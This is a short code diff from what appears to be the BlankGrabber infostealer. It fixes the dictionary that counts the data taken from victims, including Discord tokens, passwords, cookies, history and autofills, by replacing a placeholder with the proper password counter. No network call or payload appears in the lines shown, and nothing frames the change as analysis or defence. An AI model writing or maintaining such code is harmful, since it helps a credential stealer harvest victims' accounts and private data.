@@ -1603,7 +1603,7 @@ class BlankGrabber:
 
         collection = {
             "Discord Accounts" : self.DiscordTokensCount,
-            "Passwords" : self.x,
+            "Passwords" : self.PasswordsCount,
             "Cookies" : len(self.Cookies),
             "History" : self.HistoryCount,
             "Autofills" : self.AutofillCount,
